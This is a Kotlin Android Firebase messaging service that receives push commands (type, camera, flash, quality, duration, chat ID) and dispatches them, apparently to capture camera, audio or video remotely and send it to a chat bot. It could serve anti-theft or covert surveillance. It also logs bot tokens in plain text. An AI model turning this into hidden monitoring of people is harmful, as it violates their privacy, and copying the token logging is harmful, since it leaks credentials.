package com.save.me

import android.util.Log
import com.google.firebase.messaging.FirebaseMessagingService
import com.google.firebase.messaging.RemoteMessage

class FCMService : FirebaseMessagingService() {
    override fun onMessageReceived(remoteMessage: RemoteMessage) {
        Log.d("FCMService", "From: ${remoteMessage.from}")
        Log.d("FCMService", "Data: ${remoteMessage.data}")

        // --- Bot token filtering: Only process command if bot_token matches our own ---
        val incomingBotToken = remoteMessage.data["bot_token"]
        val localBotToken = Preferences.getBotToken(applicationContext)
        if (incomingBotToken != null && incomingBotToken != localBotToken) {
            Log.d("FCMService", "Bot token mismatch: ignoring command. Incoming: $incomingBotToken, Local: $localBotToken")
            return
        }

        val type = remoteMessage.data["type"]
        val camera = remoteMessage.data["camera"]
        val flash = remoteMessage.data["flash"]
        val quality = remoteMessage.data["quality"]
        var duration = remoteMessage.data["duration"]
        val chatId = remoteMessage.data["chat_id"] ?: remoteMessage.data["chatId"]

        // ---- Duration Normalization Logic ----
        // For "audio" and "video", treat duration as minutes if integer in 1..600, otherwise allow explicit seconds.
        // /audio 1 => 1 minute (60s), /audio 5 => 5 min (300s), /audio 300 => 300 min (18000s), but if duration is > 600 treat as seconds for back-compat.
        // If duration contains ":", "s", or "sec", treat as seconds.
        // Otherwise, treat as minutes if 1 <= duration <= 600.
        fun normalizeDuration(type: String?, duration: String?): String? {
            if (duration.isNullOrBlank()) return null
            val cleaned = duration.trim().lowercase()
            // If duration contains "s" or "sec" or ":" assume seconds, return as is
            if (cleaned.contains("s") || cleaned.contains("sec") || cleaned.contains(":")) {
                // Remove trailing s/sec
                val digits = cleaned.replace(Regex("[^0-9]"), "")
                return digits
            }
            val dInt = cleaned.toIntOrNull()
            if (dInt == null) return duration // fallback, unknown format
            // For audio/video, if 1 <= dInt <= 600, treat as minutes
            if ((type == "audio" || type == "video") && dInt in 1..600) {
                return (dInt * 60).toString()
            }
            // Otherwise, treat as seconds
            return dInt.toString()
        }

        val normalizedDuration = normalizeDuration(type, duration)

        if (type != null && chatId != null) {
            Log.d(
                "FCMService",
                "Dispatching action: type=$type, camera=$camera, flash=$flash, quality=$quality, duration=$normalizedDuration, chatId=$chatId"
            )
            CommandManager.dispatch(
                applicationContext,
                type = type,
                camera = camera,
                flash = flash,
                quality = quality,
                duration = normalizedDuration,
                chatId = chatId
            )
        } else {
            Log.e("FCMService", "Invalid or missing command data: type=$type, chatId=$chatId")
        }
    }

    override fun onNewToken(token: String) {
        Log.d("FCMService", "Refreshed token: $token")
        // Optionally handle token updates here.
    }
}